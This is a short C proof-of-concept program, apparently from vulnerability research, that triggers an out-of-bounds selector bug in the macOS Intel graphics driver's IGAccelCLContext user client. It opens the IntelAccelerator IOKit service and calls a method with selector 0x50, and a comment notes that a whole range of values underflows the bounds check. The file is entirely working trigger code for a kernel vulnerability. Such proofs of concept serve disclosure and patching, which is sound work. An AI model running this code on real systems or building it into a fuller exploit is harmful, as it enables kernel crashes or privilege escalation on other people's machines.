/*
clang -o ig_cl_bounds ig_cl_bounds.c -framework IOKit

IGAccelCLContext::getTargetAndMethodForIndex doesn't correctly check the bounds of the selector

see the comment in ig_gl_bounds.c for a more detailed explanation - this bug is very similar, only the bounds are different
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(int argc, char** argv){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IntelAccelerator");
  if(!matching){
   printf("unable to create service matching dictionary\n");
   return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
   printf("no matches\n");
   return 0;
  }

  io_service_t service = IOIteratorNext(iterator);
  
  if (service == IO_OBJECT_NULL){
   printf("unable to find service\n");
   return 0;
  }
  printf("got service: %x\n", service);

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 8, &conn); // type 8 == IGAccelCLContext
  if (err != KERN_SUCCESS){
   printf("unable to get user client connection\n");
   return 0;
  }

  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

  inputScalarCnt = 0;
  inputStructCnt = 0;

  outputScalarCnt = 0;
  outputStructCnt = 0;

  err = IOConnectCallMethod(
   conn,
   0x50, // any value x: 0x7 <= x <= 0xff will underflow
   inputScalar,
   inputScalarCnt,
   inputStruct,
   inputStructCnt,
   outputScalar,
   &outputScalarCnt,
   outputStruct,
   &outputStructCnt); 

  if (err != KERN_SUCCESS){
   printf("IOConnectCall error: %x\n", err);
   return 0;
  }
}
